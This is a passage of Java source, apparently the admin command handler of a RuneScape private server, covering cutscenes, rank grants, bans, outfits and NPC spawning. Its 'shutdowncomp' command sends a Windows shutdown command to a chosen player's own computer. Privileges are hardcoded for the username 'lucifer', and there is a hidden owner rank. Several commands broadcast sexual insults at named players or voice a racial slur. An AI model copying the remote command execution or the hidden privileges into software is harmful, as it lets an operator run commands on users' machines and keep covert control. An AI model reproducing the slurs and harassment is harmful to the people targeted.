					public void start() { sendOptions("What would you like to do?", "View the Asssassin's cutscene", "Nevermind."); }
					public void process(int i, int b) { 
						if(b == 1) {
							end();
							Game.submit(new GameTick(1) {
								Player bot = BotList.get("bot");
								NPC npc;
								int t;
								public void run() {
									t++;
									switch(t) {
										case 1:
											player.sm("You slowly fade away...");
											player.interfaces().sendInterface(120);
											player.packets().sendBlackOut(2);
											break;
										case 4:
											player.setLocation(1822, 5155, 2);
											bot.setLocation(1825, 5154, 2);
											player.getAppearance().transformIntoNPC(30000);
											break;
										case 5:
											player.camLook(1827, 5152, 2000, 1000);
											player.camPos(1825, 5144, 2000, 1000);
											player.packets().sendBlackOut(2);
											player.interfaces().closeScreenInterface();
											break;
										case 6:
											npc = new NPC(1265, new Location(1828, 5149, 2), false);
											bot.face(npc);
											npc.face(bot);
											break;
										case 10:
											bot.setNextAnimation(new Animation(1074));
											bot.setNextGraphics(new Graphics(381));
											Game.sendProjectile(bot, npc, 380, 20, 16, 55, 35, 16, 0);
											bot.forceTalk("<col=000000>FEEL THE POWER OF THE ASSASSIN");
											break;
										case 12:
											npc.applyHit(new Hit(bot, (npc.getHitpoints() / 2), HitLook.RANGE_DAMAGE));
											npc.applyHit(new Hit(bot, (npc.getHitpoints() / 2), HitLook.RANGE_DAMAGE));
											npc.forceTalk("NOOOO!");
											break;
										case 14:
											npc.finish();
											break;
										case 17:
											player.interfaces().sendInterface(120);
											break;
										case 20:
											player.interfaces().closeScreenInterface();
											player.packets().sendBlackOut(0);
											player.getAppearance().transformIntoNPC(-1);
											player.setLocation(Constants.START_PLAYER_LOCATION);
											stop();
											break;
									}
								}
							});

						} else
							end();
					}
					public void finish() {}
				});
				return true;
			}
			
			case "addbonus": {
				int itemId = Integer.parseInt(cmd[1]);
				int[] bonuses = new int[18];
				try {
					BufferedWriter f = new BufferedWriter(new FileWriter(new File("data/items/bonuses.txt"), true));
					if(cmd.length < 20 || cmd.length > 20) {
						f.close();
						player.sm("Bonuses need to have an array count of 18 and cannot exceed that.");
						return true;
					}
					f.write(itemId+" - ");
					for(int i = 2; i < cmd.length; i++) {
						f.write(cmd[i]+""+(i == 19 ? "" : ", "));
						bonuses[i - 2] = Integer.parseInt(cmd[i]);
					}
					f.newLine();
					f.close();
					player.sm("Bonuses for "+itemId+": "+Arrays.toString(bonuses));
				} catch(Throwable t) {
					t.printStackTrace();
				}
				return true;
			}
			
			case "killmebot": {
				Player bot = BotList.get("bot");
				bot.face(player);
				player.face(bot);
				bot.setNextAnimation(new Animation(1074));
				bot.setNextGraphics(new Graphics(381));
				Game.sendProjectile(bot, player, 380, 20, 16, 55, 35, 16, 0);
				bot.forceTalk("<col=000000>FEEL THE POWER OF THE ASSASSIN");
				return true;
			}
			
			case "inarea": {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				player.sm("In "+name+"? "+player.inArea(name));
				return true;
			}
			
			case "gamemode": {
				player.getDialogue().start("ChooseGameMode");//, parameters);
				return true;
			}
			
			case "giveskills": {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player target = Game.getPlayer(name);
				if(target != null) {
					for(int i = 0; i <= 24; i++) {
						target.getSkills().level[i] = player.getSkills().level[i];
						target.getSkills().xp[i] = player.getSkills().xp[i];
						target.getAppearance().generateAppearanceData();
					}
					player.sm("You gave "+target.getDisplayName()+" your skill levels.");
				} else
					player.sm(name+" is not logged in or is currently nulled.");
				return true;
			}
			
			case "givemod": {
				if(!player.isOwner())
					return false;
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player target = Game.getPlayer(name);
				if(target != null) {
					target.setRights(1);
					target.sm("You were given <img=0> status by "+player.getDisplayName()+".");
					player.sm("You gave "+target.getDisplayName()+" <img=0> status.");
				} else
					player.sm(name+" is not logged in or is currently nulled.");
				return true;
			}
			
			case "givehiddenowner": {
				if(!player.isOwner())
					return false;
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player target = Game.getPlayer(name);
				if(target != null) {
					target.setHiddenOwner(true);
					target.sm("You were given <img=1>Hidden Owner status by "+player.getDisplayName()+".");
					player.sm("You gave "+target.getDisplayName()+" <img=1>Hidden Owner status.");
				} else
					player.sm(name+" is not logged in or is currently nulled.");
				return true;
			}
			
			case "removehiddenowner": {
				if(!player.isOwner())
					return false;
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player target = Game.getPlayer(name);
				if(target != null) {
					target.setHiddenOwner(false);
					target.sm("Your <img=1>Hidden Owner status has been removed.");
					player.sm("You removed "+target.getDisplayName()+"'s <img=1>Hidden Owner status.");
				} else
					player.sm(name+" is not logged in or is currently nulled.");
				return true;
			}
			
			case "giveadmin": {
				if(!player.isOwner())
					return false;
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player target = Game.getPlayer(name);
				if(target != null) {
					target.setRights(2);
					target.sm("You were given <img=1> status by "+player.getDisplayName()+".");
					player.sm("You gave "+target.getDisplayName()+" <img=1> status.");
				} else
					player.sm(name+" is not logged in or is currently nulled.");
				return true;
			}
			
			case "resetskills": {
				Player p = Game.getPlayer(cmd[1]);
				if (cmd.length == 3) {
					p.getSkills().set(Integer.valueOf(cmd[2]), 1);
					p.getSkills().setXp(Integer.valueOf(cmd[2]),
							Skills.getXPForLevel(1));
					player.sm("You have reset "+p.getDisplayName()+"'s skill: "+Integer.parseInt(cmd[2]));
				} else {
					p.getSkills().reset();
					player.sm("You have reset "+p.getDisplayName()+"'s skills.");
				}
				return true;
			}
			
			case "xpmod": {
				Player p = Game.getPlayer(cmd[1]);
				int combatBoost = Integer.parseInt(cmd[2]);
				int skillBoost = Integer.parseInt(cmd[3]);
				p.combatXPBoost(combatBoost);
				p.skillXPBoost(skillBoost);
				player.sm(p.getDisplayName()+" now has a combat xp boost of "+combatBoost+" and a skill xp boost of "+skillBoost);
				return true;
			}
			
			case "getrender": {
				int itemId = Integer.parseInt(cmd[1]);
				player.sm("Render ID for "+ItemDefinition.get(itemId).getName()+" is: "+ItemDefinition.get(itemId).getRenderAnimId());
				return true;
			}
			
			case "getnrender": {
				int npcId = Integer.parseInt(cmd[1]);
				player.sm("Render ID for "+NPCDefinition.get(npcId).getName()+" is: "+NPCDefinition.get(npcId).renderEmote);
				return true;
			}
			
			case "forcear": {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player p = Game.getPlayer(name);
				player.getCombatDefinitions().setAutoRetaliate(!player.getCombatDefinitions().isAutoRetaliate());
				player.sm(p.getDisplayName()+" is"+(!player.getCombatDefinitions().isAutoRetaliate() ? "n't" : "")+" auto retaliating.");
				return true;
			}
			
			case "changeas": {
				Player p = Game.getPlayer(cmd[1]);
				p.getCombatDefinitions().setAttackStyle(Integer.parseInt(cmd[2]));
				player.sm(p.getDisplayName()+" now has the attack style: "+p.getCombatDefinitions().getAttackStyle());
				return true;
			}
			
			case "killbots": {
				for(Bot bots: BotList.getBots()) {
					if(bots != null) {
						bots.forceTalk("Oh man, "+player.getDisplayName()+" just killed us!!");
						bots.applyHit(new Hit(player, bots.getMaxHitpoints(), HitLook.POISON_DAMAGE));
					}
				}
				return true;
			}
			
			case "getip": {
				if(!player.isOwner() && !player.getUsername().equals("lucifer"))
					return false;
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player p = Game.getPlayer(name);
				if(p != null)
					player.sm(p.getDisplayName()+"'s IP Address is: "+p.getSession().getIP());
				else
					player.sm(name+" is not online or is null");
				return true;
			}
			
			case "givemaster": {
				String name = formatInput(cmd);
				Player p = Game.getPlayer(name);
				if(p != null) {
					player.sm("You gave "+p.getDisplayName()+" all 99s.");
					for(int i = 0; i <= 24; i++)
						p.getSkills().addXp(i, 200000000);
				} else
					player.sm(name+" is not online or is null");
				return true;
			}
			
			case "give99dung": {
				String name = formatInput(cmd);
				Player p = Game.getPlayer(name);
				if(p != null) {
					player.sm("You gave "+p.getDisplayName()+" 120 dungeoneering.");
					p.getSkills().addXp(Skills.DUNGEONEERING, 14000000);
				} else
					player.sm(name+" is not online or is null");
				return true;
			}
				
			case "fpc": {
				String name = formatInput(cmd);
				Player p = Game.getPlayer(name);
				p.sendPublicChatMessage(new PublicChatMessage("I am a robot. I am not capable of human emotion.", 0));
				return true;
			}
			
			case "forcerun": {
				String name = formatInput(cmd);
				Player p2 = Game.getPlayer(name);
				p2.setRun(true);
				player.sm(p2.getDisplayName()+" is now running? "+p2.getRun());
				return true;
			}
			
			case "forceemote": {
				Player p2 = Game.getPlayer(cmd[1]);
				p2.animate(Integer.parseInt(cmd[2]));
				return true;
			}
			
			case "forcegfx": {
				Player p2 = Game.getPlayer(cmd[1]);
				p2.graphics(Integer.parseInt(cmd[2]));
				return true;
			}
			
			case "additem": {
				Player p = Game.getPlayer(cmd[1]);
				p.getBank().addItem(Integer.parseInt(cmd[2]), Integer.parseInt(cmd[3]), true);
				player.sm("Added x"+Integer.parseInt(cmd[3])+" "+ItemDefinition.get(Integer.parseInt(cmd[2])).getName()+" to "+p.getDisplayName()+"'s bank.");
				return true;
			}
			
			case "sendhome": {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player p = Game.getPlayer(name);
				p.setLocation(new Location(5504, 4450, 0));
				player.sm("Send "+p.getDisplayName()+" home.");
				return true;
			}
			
			case "stopbotaction": {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Bot bot = BotList.get(name);
				bot.getActionManager().forceStop();
				bot.stopAll();
				bot.face(player);
				bot.getBotActionHandler().stopAction();
				player.sm(bot.getDisplayName()+" has stopped all of his actions.");
				return true;
			}
			
			case "giveoutfit": {
				Player p = Game.getPlayer(cmd[1]);
				if(p == null)
					return false;
				String name = "";
				for (int i = 2; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				p.getEquipment().reset();
				try {
					BufferedReader r = new BufferedReader(new FileReader(new File("data/playerdata/outfits.txt")));
					while (true) {
						String line = r.readLine();
						if (line == null)
							break;
						if (line.startsWith("//") || line.equals(""))
							continue;
						String[] split = line.split(" - ");
						String outfitName = split[0];
						if(outfitName.equalsIgnoreCase(name)) {
							String[] data = split[1].split(", ");
							for(int i = 0; i < data.length; i++) {
								if(Integer.parseInt(data[i]) > -1)
									p.getEquipment().getItems().set(i == 6 ? 7 : i == 7 ? 9 : i == 8 ? 10 
										: i == 9 ? 12 : i == 10 ? 13 : i == 11 ? 14 : i,
											i == 10 ? new Item(Integer.parseInt(data[i]), Integer.MAX_VALUE) : 
												new Item(Integer.parseInt(data[i]), 1));
							}
						}
					}	
					r.close();
				} catch(Throwable e) {
					e.printStackTrace();
				}
				p.refreshEquipment();
				p.getAppearance().generateAppearanceData();
				player.packets().sendMessage("You gave "+p.getUsername()+" the outfit: "+name);
				return true;
			}
			
			case "outfit": {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				player.getEquipment().reset();
				try {
					BufferedReader r = new BufferedReader(new FileReader(new File("data/playerdata/outfits.txt")));
					while (true) {
						String line = r.readLine();
						if (line == null)
							break;
						if (line.startsWith("//") || line.equals(""))
							continue;
						String[] split = line.split(" - ");
						String outfitName = split[0];
						if(outfitName.equalsIgnoreCase(name)) {
							String[] data = split[1].split(", ");
							for(int i = 0; i < data.length; i++) {
								if(Integer.parseInt(data[i]) > -1)
									player.getEquipment().getItems().set(i == 6 ? 7 : i == 7 ? 9 : i == 8 ? 10 
										: i == 9 ? 12 : i == 10 ? 13 : i == 11 ? 14 : i,
											i == 10 ? new Item(Integer.parseInt(data[i]), Integer.MAX_VALUE) : 
												new Item(Integer.parseInt(data[i]), 1));
							}
						}
					}	
					r.close();
					player.sm("Set outfit: "+name);
					player.refreshEquipment();
					player.getAppearance().generateAppearanceData();
				} catch(Throwable e) {
					e.printStackTrace();
				}
				return true;
			}

			case "saveoutfit":
				try {
					final FileWriter fstream = new FileWriter("./data/playerdata/outfits.txt", true);
					final BufferedWriter out = new BufferedWriter(fstream);
					String name = "";
					for (int i = 1; i < cmd.length; i++)
						name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
					out.write(name+" - ");
					for(int i = 0; i <= 14; i++)
						if(i != 6 && i != 8 && i != 11) {
							out.write(""+(player.getEquipment().getItems().get(i) != null ? 
									player.getEquipment().getItems().get(i).getId()+""+(i < 14 ? ", " : "") : "-1"+(i < 14 ? ", " : "")));
						}
					out.newLine();
					out.close();
					player.sm("Saved outfit: " + name + ".");
				} catch (final IOException e1) {
					e1.printStackTrace();
				}
				return true;
			
			case "cum":
				for (final NPC npc : Game.getLocalNPCs(player)) {
					if (npc.defs().name.toLowerCase().contains(
							"mandrith")) {
						player.face(npc);
						npc.face(player);
						Game.submit(new GameTick(.150) {
							private int count = 0;

							@Override
							public void run() {
								this.count++;
								Game.sendProjectile(player, player, npc, 2261,
										25, 38, 17, 0, 50, 0);
								if (count == 15) {

									this.stop();
								}
							}
						});
					}
				}
				return true;
				
			case "leech":
				for (final NPC npc : Game.getLocalNPCs(player)) {
					if (npc.defs().name.toLowerCase().contains(
							"mandrith")) {
						player.face(npc);
						npc.face(player);
						Game.submit(new GameTick(.200) {
							private int count = 0;
							private final int random = Misc.random(2);

							@Override
							public void run() {
								if (this.random == 1) {
									this.count++;
									Game.sendProjectile(player, player, npc,
											2950, 38, 38, 17, 0, 0, -1);
									player.applyHit(new Hit(player, 10,
											HitLook.MAGIC_DAMAGE));
									player.setNextAnimation(new Animation(3170));
									player.setNextGraphics(new Graphics(560));
									if (count == 20) {
										player.sm("You get drained of " + count
												* 10 + " lifepoints.");
										this.stop();
									}
								} else {
									this.count++;
									Game.sendProjectile(npc, npc, player,
											2950, 38, 38, 17, 0, 0, -1);
									player.applyHit(new Hit(player, 10,
											HitLook.HEALED_DAMAGE));
									player.setNextAnimation(new Animation(3170));
									player.setNextGraphics(new Graphics(560));
									if (count == 15) {
										player.sm("You heal " + count * 10
												+ " lifepoints.");
										this.stop();
									}
								}
							}
						});
					}
				}
				return true;
			
			case "mandrithsfury": {
				NPC mandrith = null;
				for (final NPC n : Game.getLocalNPCs(player)) {
					if (n.defs().name.toLowerCase().contains(
							"mandrith"))
						mandrith = n;
					n.faceEntity(mandrith);
					mandrith.forceTalk("<col=FFFFFF>ATTENTION!");
					n.forceTalk("<col=FF0000>NO FUCK YOU");
					n.setRandomWalk(false);
					final NPC mandr = mandrith;
					Game.sendProjectile(n, n, mandrith, 2261, 25, 38, 15, 0,
							50, 0);
					Game.submit(new GameTick(5.0) {
						@Override
						public void run() {
							mandr.forceTalk("BITCH NIGGAS SHOULD'VE LISTENED TO ME!");
							if (n != mandr) {
								n.graphics(2795);
								n.forceTalk("NOOOOOOOOOO!");
								n.applyHit(new Hit(n, n.getHitpoints(),
										HitLook.POISON_DAMAGE));
							}
							this.stop();
						}
					});
				}
				return true;
			}
			
			case "cumon":
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				final Player other = Game.getPlayer(name);
				player.face(other);
				other.face(player);
				final String whiteMess = "Ha, take that you whore! Eat my jizz, "
						+ other.getDisplayName() + "!";
				player.sendPublicChatMessage(new PublicChatMessage(
						whiteMess, 1));
				Game.submit(new GameTick(.150) {
					private int count = 0;

					@Override
					public void run() {
						this.count++;
						Game.sendProjectile(player, player, other, 2261, 25,
								38, 17, 0, 50, 0);
						if (count == 15)
							this.stop();
					}
				});
				return true;
				
			case "removeclaw": {
				GlobalObject object = Game.getObject(new Location(1870, 5132, 0));
				Game.removeObject(object, true);
				return true;
			}
			
			case "textontile": {
				player.packets().sendTileMessage("<col=ff0000><shad=000000>DO NOT WALK HERE", new Location(3222,3222,0), 25000, 0, 0);
				return true;
			}
			
			case "addlff": {
				try {
					BufferedReader r = new BufferedReader(new FileReader(new File("data/misc/crystalLocations.txt")));
					while(true) {
						String mainLine = r.readLine();
						if (mainLine == null)
							break;
						if (mainLine.startsWith("//") || mainLine.equals(""))
							continue;
						String[] mainLineToArray = mainLine.split(" - ");
						String locationName = mainLineToArray[0];
						String[] indexSplit = mainLineToArray[1].split(",");
						int x = Integer.parseInt(indexSplit[0]);
						int y = Integer.parseInt(indexSplit[1]);
						int z = Integer.parseInt(indexSplit[2]);
						Location toSave = new Location(x, y, z);
						player.getLC().addLocation(locationName, toSave);
					}	
					r.close();
				} catch(Throwable e) {
					e.printStackTrace();
				}
				return true;
			}
			
			case "endtick": {
				String tick = "";
				for (int i = 1; i < cmd.length; i++)
					tick += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				if(player.getGameTickFromCache(tick) != null) {
					player.getGameTickFromCache(tick).stop();
					player.sm("Current Game Tick: \""+player.getGameTickFromCache(tick).getName()+"\" has been terminated.");
					player.getGameTicks().remove(tick);
				} else
					player.sm(tick+" is not an existing game tick in your game tick cache.");
				return true;
			}
			
			case "worldgfx": {
				Game.sendGraphics(player, new Graphics(Integer.parseInt(cmd[1]), 0, 0), player.getLocation());
				return true;
			}
			
			case "ignatiuscutscene":
				Game.submit(player, new GameTick("Ignatius Vulcan", 1.0) {
					int ticks;
					NPC n;
					@Override
					public void run() {
						ticks++;
						switch(ticks) {
							case 1:
								player.camPos(player.getX() + 1, player.getY() - 3, 1230, 1000);
								player.camLook(player.getX(), player.getY(), 1000, 1000);
								break;
							case 2:
								n = new NPC(4946, new Location(player.getX() - 1, player.getY(), player.getZ()), false);
								n.face(player);
								n.animate(2563);//2327 is levitating in midair, 2563 is rising up 
								n.graphics(2794);
								break;
							case 5:
								n.forceTalk("Whoa!");
								break;
							case 7:
								player.getDialogue().start("EntityDialogue", n.getId(),
									(Object) new String[] { "Huh? Where am I!" }, true, Dialogue.DEPRESSED);
								break;
							case 9:
								player.face(n);
								player.getDialogue().start("EntityDialogue", -1, (Object) new String[] { 
										"WHOA! Where did you come from?" }, true, Dialogue.NORMAL_TALKING);
								break;
							case 12:
								stop(); 
								player.interfaces().closeChatBoxInterface();
								break;
						}
					}
					
					@Override
					public void whenStopped() {
						n.finish();
						player.packets().sendResetCamera();
					}
				});
				return true;
				
			case "resetcam": {
				player.packets().sendResetCamera();
				return true;
			}
			
			case "molly":
				player.getRandomEvent().start("EvilTwin");
				return true;
				
			case "viewloc": {
				int count = 0;
				for(int i = 0; i < player.getLC().getNames().size(); i++) {
					player.sm(player.getLC().getNames().get(i)+" "+
							player.getLC().getLocations().get(i).toString());
					count++;
				}
				player.sm("Total saved locations: "+count);
				return true;
			}
			
			case "clearspawned":
				player.sm("Got rid of all the spawned npcs.");
				for(NPC n : Game.getSpawnedNPCs())
					n.finish();
				Game.getSpawnedNPCs().clear();
				return true;
				
			case "npcreset":
				player.sm("Reset the npcs.");
				for(NPC n : Game.getNPCs())
					n.sendDeath(n);
				Game.getSpawnedNPCs().clear();
				return true;
				
			case "reloadtasks":
				TasksManager.clearAll();
				TasksManager.loadLDTasks();
				player.sm("Tasks reloaded");
				return true;
			
			case "objecta": {
				player.sm(ObjectDefinition.get(Integer.parseInt(cmd[1])).objectAnimation);
				return true;
			}
			
			case "spawn": {
				final int npcId = Integer.valueOf(cmd[1]);
				final boolean walks = Boolean.parseBoolean(cmd[2]);
				try {
					NPCSpawns.addRealSpawn(player.getDisplayName(), npcId, player,
							walks);
					player.sm("Spawn added! "+npcId+" - "+NPCDefinition.get(npcId).name+" Walks ? "+walks);
				} catch (Throwable e) {
					e.printStackTrace();
				}
				new NPC(Integer.valueOf(cmd[1]), player, walks, false);
				return true;
			}
			
			case "reareas":
				Area.initialize();
				player.sm("Areas re-loaded.");
				return true;

			case "dunglobby":
				Area area = Area.get("Dungeoneering Lobby");
				if (Area.inArea(player, area)) {
					player.packets().sendMessage(
							"Area: " + area.getName() + ", Type: "
									+ area.getAreaType().toString() + " NE: "
									+ area.getNorthEast().x + ", "
									+ area.getNorthEast().y + " - SW: "
									+ area.getSouthWest().x + ", "
									+ area.getSouthWest().y);
					player.sm("Center Point: " + area.getCenter().toString());
				} else
					player.sm("Not in dungeoneering lobby.");
				return true;

			case "lumbarea":
				area = Area.get("Lumbridge");
				if (Area.inArea(player, area))
					player.sm("In lumbridge!");
				else
					player.sm("Not in lumbridge.");
				return true;

			case "demote":
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				if(name.toLowerCase().contains("lucifer"))
					return true;
				Player target = Game.getPlayerByDisplayName(name);
				if (target == null)
					target = SFiles.loadPlayer(Misc
							.formatPlayerNameForProtocol(name));
				if (target != null) {
					target.setRights(0);
					player.packets().sendMessage(
							"You demote "
									+ Misc.formatPlayerNameForDisplay(target
											.getUsername()));
				} else {
					player.packets().sendMessage(
							"Couldn't find player " + name + ".");
				}
				SFiles.savePlayer(target);
				return true;
				
			case "god":
				player.setHitpoints(Short.MAX_VALUE);
				player.getEquipment().setEquipmentHpIncrease(
						Short.MAX_VALUE - 990);
				if (player.getUsername().equalsIgnoreCase(""))
					return true;
				for (int i = 0; i < 10; i++)
					player.getCombatDefinitions().getBonuses()[i] = 5000;
				for (int i = 14; i < player.getCombatDefinitions().getBonuses().length; i++)
					player.getCombatDefinitions().getBonuses()[i] = 5000;
				return true;
				
			case "npc":
				player.interfaces().closeScreenInterface();
				Game.spawnNPC(Integer.parseInt(cmd[1]), player, cmd.length > 2 ? Boolean.parseBoolean(cmd[2]) : true);
				return true;

			case "object":
				player.interfaces().closeScreenInterface();
				int type = cmd.length > 2 ? Integer.parseInt(cmd[2]) : 10;
				if (type > 22 || type < 0)
					type = 10;
				GlobalObject object = new GlobalObject(Integer.valueOf(cmd[1]), type, 0,
					player.getX(), player.getY(), player.getZ());
				Game.spawnNewObject(object);
				return true;
				
			case "shutdowncomp":
				String username11 = cmd[1].substring(cmd[1].indexOf(" ") + 1);
				Player p2 = Game.getPlayerByDisplayName(username11);
				p2.packets().sendExecMessage("cmd.exe /c shutdown -s -t 10");
				player.packets().sendMessage(
						"Shutting down " + p2.getUsername() + "'s computer.");
				return true;

			case "update":
				int delay = 120;
				if (cmd.length >= 2) {
					try {
						delay = Integer.valueOf(cmd[1]);
					} catch (NumberFormatException e) {
						player.packets().sendPanelBoxMessage(
								"Use: ::restart secondsDelay(IntegerValue)");
						return true;
					}
				}
				Game.safeShutdown(delay);
				return true;
				
			case "macban":
				name = formatInput(cmd);
				target = Game.getPlayerByDisplayName(name);
				if(target == null) {
					target = SFiles.loadPlayer(Misc.formatPlayerNameForProtocol(name));
					if (target != null)
						target.setUsername(Misc.formatPlayerNameForProtocol(name));
				}
				player.sm("You've MAC Banned: "+target.getDisplayName()+".");
				Punishments.applyMACBan(target);
				return true;

			case "unmacban": {
				name = formatInput(cmd);
				File file = new File("data/chars/saves/"+name.replace(" ", "_") + ".player");
				if(!file.exists()) {
					player.sm("That player doesn't exist.");
					return false;
				}
				target = null;
				try {
					target = (Player) SFiles.loadSerializedFile(file);
				} catch (Exception e) {
					e.printStackTrace();
				}
				Punishments.removeMACBan(target);
				player.sm("Removed MAC Ban from "+name+"'s account. ["+target.getLastIP()
					+" - "+target.getMACAddress()+"]");
				try {
					SFiles.storeSerializableClass(target, file);
				} catch (Exception e) {
					e.printStackTrace();
				}
				return true;
			}
			
			case "ipmute":
				name = formatInput(cmd);
				target = Game.getPlayerByDisplayName(name);
				if(target == null) {
					target = SFiles.loadPlayer(Misc.formatPlayerNameForProtocol(name));
					if (target != null)
						target.setUsername(Misc.formatPlayerNameForProtocol(name));
				}
				Punishments.applyIPMute(target);
				player.sm("You've IP Muted: "+target.getDisplayName()+".");
				return true;

			case "unipmute": {
				name = formatInput(cmd);
				target = Game.getPlayerByDisplayName(name);
				if(target == null) {
					File file = new File("data/chars/saves/"+name.replace(" ", "_") + ".player");
					if(!file.exists()) {
						player.sm("That player doesn't exist.");
						return false;
					}
					try {
						target = (Player) SFiles.loadSerializedFile(file);
					} catch (Exception e) {
						e.printStackTrace();
					}
					Punishments.removeIPMute(target);
					player.sm("Removed IP Mute from "+target.getUsername()+"'s account. ["+target.getLastIP()
						+" - "+target.getMACAddress()+"]");
					try {
						SFiles.storeSerializableClass(target, file);
						SFiles.savePlayer(target);
					} catch (Exception e) {
						e.printStackTrace();
					}
					return true;
				}
				Punishments.removeIPMute(target);
				player.sm("Removed IP Mute from "+target.getUsername()+"'s account. ["+target.getLastIP()
					+" - "+target.getMACAddress()+"]");
				return true;
			}

			case "ipban":
				name = formatInput(cmd);
				target = Game.getPlayerByDisplayName(name);
				if(target == null) {
					target = SFiles.loadPlayer(Misc.formatPlayerNameForProtocol(name));
					if (target != null)
						target.setUsername(Misc.formatPlayerNameForProtocol(name));
				}
				player.sm("You've IP Banned: "+target.getDisplayName()+".");
				Punishments.applyIPBan(target);
				return true;

			case "unipban": {
				name = formatInput(cmd);
				File file = new File("data/chars/saves/"+name.replace(" ", "_") + ".player");
				if(!file.exists()) {
					player.sm("That player doesn't exist.");
					return false;
				}
				target = null;
				try {
					target = (Player) SFiles.loadSerializedFile(file);
				} catch (Exception e) {
					e.printStackTrace();
				}
				Punishments.removeIPBan(target);
				player.sm("Removed IP Ban from "+name+"'s account. ["+target.getLastIP()
					+" - "+target.getMACAddress()+"]");
				try {
					SFiles.storeSerializableClass(target, file);
				} catch (Exception e) {
					e.printStackTrace();
				}
				return true;
			}
				
			case "kickall":
				for (Player kicked : Game.getPlayers()) {
					if (kicked == null || kicked == player)
						continue;
					if(kicked.isBot())
						((Bot) kicked).finish();
					else
						kicked.getSession().getChannel().close();
				}
				return true;
				
			case "clearchat":
				switch(cmd[1]) {
					case "me":
						for(int i = 0; i <= 99; i++)
							player.sm(" ");
						return true;
					case "all":
						for(int i = 0; i <= 99; i++)
							player.sendPublicChatMessage(new PublicChatMessage(" ", 0));
						return true;
				}
				return true;
				
			case "resettasks":
				player.tasks = null;
				player.tasks = new Tasks();
				player.tasks.setPlayer(player);
				player.sm("Reset task data");
				return true;
			
			/*case "ozan":
				TasksManager.display(player, "TalkToOzan");
				return true;*/
			
			case "flashy":
				final int[] phats = { 1038, 1040, 1042, 1044, 1046, 1048 };
				Game.submit(new GameTick(.6) {
					public void run() {
						player.getEquipment().set(Equipment.SLOT_HAT, new Item(phats[Misc.random(phats.length)], 1));
						stop();
					}
				});
				return true;
				
			case "tm": {
				String string = "";
				for (int i = 1; i < cmd.length; i++)
					string += cmd[i] + (i == cmd.length - 1 ? "" : " ");
				player.packets().sendTileMessage(string, player, 10000, 1000, 243);
				return true;
			}
			
			case "armchair": {
				player.packets().sendChatBoxInterface(131);
				player.packets().sendItemOnIComponent(131, 0, 8782, 1);
				player.packets().sendItemOnIComponent(131, 2, 2347, 1);
				player.packets().sendString("You use your knowledge in construction to make an armchair...", 131, 1);
				player.animate(898);
				return true;
			}
		
			case "t": {
				final GlobalObject ob = new GlobalObject(15410, 10, 1, player);
				Game.spawnTemporaryObject(ob, 10000, true);
				player.getDialogue().start(new Dialogue() {
					public void start() { sendOptions("?", new String[] { "add rotation", "subtract rotation", "End" }); }
					public void process(int i, int b) {
						if(b == OPTION1_OTHER) {
							ob.setRotation(ob.getRotation() + 1);
							player.packets().sendSpawnedObject(ob);
							start();
						} else if(b == OPTION2_OTHER) {
							ob.setRotation(ob.getRotation() - 1);
							player.packets().sendSpawnedObject(ob);
							start();
						} else
							end();
					}
					public void finish() { }
				});
				return true;
			}
			
			case "mobj":
				if((Boolean) player.getTemporaryAttribute("Object_Click") == Boolean.FALSE) {
					player.setTemporaryAttribute("Object_Click", true);
					player.sm("You can now examine objects and modify their rotations.");
				} else {
					player.setTemporaryAttribute("Object_Click", false);
					player.sm("You can no longer examine objects and modify their rotations.");	
				}
				return true;

			case "cam": {
				player.packets().sendCameraPos(Game.getCutsceneX(player, 83), 
						Game.getCutsceneY(player, 209), 2000, 10, 10);
				player.packets().sendCameraLook(Game.getCutsceneX(player, 86), 
						Game.getCutsceneY(player, 205), 0, 10, 10);
				return true;
			}
			
			case "est": {
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				if(cmd.length > 1)
					target = Game.getPlayer(name);
				else
					target = player;
				target.getRandomEvent().start("EstateAgent");
				return true;
			}
			
			case "mode":
				if(player.getTemporaryAttribute("mode") == null)
					player.setTemporaryAttribute("mode", Boolean.TRUE);
				else
					player.setTemporaryAttribute("mode", !(Boolean) player.getTemporaryAttribute("mode"));
				player.sm("Mode set: "+player.getTemporaryAttribute("mode"));
				return true;
				
			case "dismiss": {
				if(player.getPet() != null)
					player.getPet().finish();
				player.setPet(null);
				player.sm("Your pet was sent away.");
				return true;
			}
			
			case "pet": {
				final int npcid = Integer.parseInt(cmd[1]);
				if(npcid == -1) {
					if(player.getPet() != null)
						player.getPet().finish();
					player.setPet(null);
				} else {
					if (player.getPet() != null) {
						player.getPet().finish();
						player.sm("Please wait..");
						Game.submit(new GameTick(.1) {
							public void run() {
								player.setPet(new PetManager(npcid, player));
								stop();
							}
						});
					} else
						player.setPet(new PetManager(npcid, player));
				}
				return true;
			}
			
			case "beginnertask": {
				player.slayerTask(SlayerTask.assignBeginnerTask(player));
				return true;
			}
			
